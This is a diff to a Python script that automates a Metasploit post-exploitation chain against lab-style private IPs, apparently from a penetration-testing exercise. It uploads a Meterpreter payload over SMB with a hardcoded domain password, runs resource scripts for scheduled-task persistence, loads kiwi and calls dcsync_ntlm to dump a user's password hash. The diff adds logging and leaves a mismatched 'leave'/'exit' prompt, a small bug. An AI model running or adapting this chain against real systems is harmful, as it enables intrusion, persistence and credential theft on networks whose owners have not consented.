@@ -1,5 +1,6 @@
 import os
 import subprocess
+import logging
 
 TARGET_IPS = ['172.22.117.10', '172.22.117.20']
 TARGET_PORTS = [22, 80, 443]
@@ -14,6 +15,10 @@ RESOURCE_SCRIPTS = [
 ]
 
 ATTACKER_IP = '172.22.117.100'
+LOG_FILE = 'exploit_log.txt'
+
+# Configure logging
+logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 def execute_command(command):
     process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
@@ -47,7 +52,7 @@ def generate_msfshell_exe():
     # This could involve waiting for user interaction or automatically executing commands
     # Ensure you handle any potential errors or exceptions that may occur during session handling
     while True:
-        command = input("Enter a command ('exit' to return to script execution): ")
+        command = input("Enter a command ('leave' to return to script execution): ")
         if command == 'exit':
             break
         execute_command(f'{METASPLOIT_PATH}/msfconsole -x "{command}"')
@@ -56,6 +61,14 @@ def cleanup():
     # Implement any cleanup logic here
     # This could involve deleting temporary files or closing connections
     pass
+
+def log_info(message):
+    logging.info(message)
+    print(message)
+
+def log_error(message):
+    logging.error(message)
+    print(f'[ERROR] {message}')
 
 def main():
     try:
@@ -68,59 +81,78 @@ def main():
         # Iterate through target IPs and ports
         for target_ip in TARGET_IPS:
             for target_port in TARGET_PORTS:
+                log_info(f'Exploiting target {target_ip}:{target_port}...')
+                
                 # Connect to target
                 if not connect_to_target(target_ip, target_port):
+                    log_error(f'Failed to connect to {target_ip}:{target_port}')
                     continue
 
                 # Exploit target
                 if not exploit_target(target_ip, target_port):
+                    log_error(f'Failed to exploit {target_ip}:{target_port}')
                     continue
 
                 # Handle meterpreter session
+                log_info('Handling meterpreter session...')
                 handle_meterpreter_session()
 
                 # Execute resource1.rc
                 execute_command(f'{METASPLOIT_PATH}/msfconsole -r ~/resource1.rc')
-
+                log_info('Handling resource1.rc session...')
+                
                 # After resource1.rc
                 execute_command(f'smbclient //{target_ip}/C$ -U megacorpone/tstark -c "password=Password!; put msfshell.exe; exit"')
-
+                log_info('Handling smbclient session...')
+                
                 # Execute resource2.rc
                 execute_command(f'{METASPLOIT_PATH}/msfconsole -r ~/resource2.rc')
-
+                log_info('Handling resource2.rc session...')
+                
                 # Execute resource3.rc
                 execute_command(f'{METASPLOIT_PATH}/msfconsole -r ~/resource3.rc')
-
+                log_info('Handling resource3.rc session...')
+                
                 # Request shell in meterpreter session
                 handle_meterpreter_session()
-
+                log_info('Handling shell in meterpreter session...')
+                
                 # Execute schtasks command
                 execute_command(f'{METASPLOIT_PATH}/msfconsole -r ~/resource4.rc')
-
+                log_info('Handling schtasks session...')
+                
                 # Exit shell and return to meterpreter
                 handle_meterpreter_session()
-
+                log_info('Handling exiting shell, returning to meterpreter session...')
+                
                 # Exit and return to msfconsole
                 execute_command(f'{METASPLOIT_PATH}/msfconsole -r ~/resource5.rc')
-
+                log_info('Handling exiting meterpreter session...')
+                
                 # Execute sysinfo command in meterpreter
                 handle_meterpreter_session()
-
+                log_info('Handling sysinfo command in meterpreter session...')
+                
                 # Request shell in meterpreter session
                 handle_meterpreter_session()
-
+                log_info('Handling shell in meterpreter session...')
+                
                 # Execute net users command
                 execute_command(f'{METASPLOIT_PATH}/msfconsole -x "net users"')
-
+                log_info('Handling net users command session...')
+                
                 # Exit back to meterpreter
                 handle_meterpreter_session()
-
+                log_info('Handling back to meterpreter session...')
+                
                 # Load kiwi in msfconsole again
                 execute_command(f'{METASPLOIT_PATH}/msfconsole -x "load kiwi"')
-
+                log_info('Handling kiwi session...')
+                
                 # Execute dcsync_ntlm command
                 execute_command(f'{METASPLOIT_PATH}/msfconsole -x "dcsync_ntlm cdanvers"')
-
+                log_info('Handling dcsync_ntlm...')
+    
     finally:
         cleanup()
 
